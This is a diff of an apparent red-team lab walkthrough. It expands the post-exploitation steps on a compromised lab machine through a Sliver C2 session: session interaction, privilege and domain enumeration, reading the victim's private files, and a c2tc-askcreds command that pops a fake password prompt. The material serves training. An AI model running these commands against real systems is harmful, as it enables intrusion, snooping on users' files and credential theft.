@@ -189,19 +189,82 @@ You now have an initial foothold!
 
 On evil, check the sliver tab. You should now see a new session.
 
-In the sliver tab do
+In the sliver tab let us interact with the current session. The syntax is sessions -i <session name>.
+Your session should have the name JOYOUS_MORTGAGE, so the command would be
+```
+sessions -i JOYOUS_MORTGAGE
+```
+We now interact with the session, so we can type
+```
+info
+```
+to get some information including the username, machine name, OS and version, SIDs (will be discussed later) and more.
 
-sessions -i <name of session>
+![Sliver Interaction](assets/sliver-interaction.png)
 
 ### Situational Awareness : Learning about the compromised environment.
 
-You are now in control of garfield machine. Let us learn more about it.
+You are now in control of garfield's machine. We could essentially do anything he can do on his machine.
 
-<sliver commmands to learn more aobut the system, info, ls, pwd etc.>
+Let us learn more about the environment. An intruder may here come prepared with scripts to fetch information about everything, ip, routing, recently visited sites, the users mailbox, ...
+
+Here we will focus on information necessary for the completion of this mission!
+
+The intruder may first want to find out about the compromised user's permissions, group membership in Active Directory and so forth. In your sliver session window type sa-whoami.
+
+```
+sa-whoami
+```
+
+![sa-whoami](assets/sa-whoami.png)
+
+This will display some interesting information, such as the Active Directory groups garfield belongs to. We also see that he is not a very privileged user, but he does belong to one group (Helpdesk Support) that may be interesting.
+
+
+We may want to learn about the Active Directory domain. We can use a built in windows command for this.
+
+```
+execute -o nltest /dclist:
+```
+![nltest](assets/nltest.png)
+
+We can see that the machine has joined the Active Directory domain via its domain controller dc01.crueltesting.com. Good to know?
+
+### Learning about Garfields not-so-private-anymore files.
+
+The intruder would typically use scripts to find files or emails with keywords.
+
+Here we will just access them directly via standard commands, change into garfield's TODOs directory that contains messages from his manager.
+```
+cd C:/Users/garfield/Documents/TODOs
+```
+and then check what files there are
+```
+ls
+```
+![Todos](TODOs.png)
+
+Now we can read the messages to Garfield from his manager.
+
+Type the following commands in your sliver session (the command cat shows the content of a file, showing feline domination)
+
+```
+cat resetpasswords.txt
+```
+
+```
+cat mice-management-access.txt
+```
+```
+cat tomcat-patch.txt
+```
+We learn that the he is supposed to reset a service account weekly, we learn about a fileshare with some interesting content (that garfield cannot access yet, because he is not a domainadmin) and we learn about a system "tomcat" that needs patching.
+
+
 
 ### Pivoting to to other sytems
 
-Now that we control one system, we ca actually reach any other system on the inside, in spite of the firewall blocking incoming traffic. This is shown in picture below
+Now that we control one system, we ca actually reach any other system on the inside, in spite of the firewall blocking incoming traffic. This is shown in the picture below
 
 <picture showing access to internal systems via outgoing session from compromised machine >
 
@@ -238,7 +301,7 @@ But, we can ask politely.
 
 In our sliver session tab, type
 
-c2tc-askcreds for "garfield@hacklab.crueltesting"
+c2tc-askcreds for "garfield@crueltesting.com"
 
 Now go back to your tab for the RDP session to client1 cruelcomputing. You will see that a window has opened asking garfield for his credentials.
 
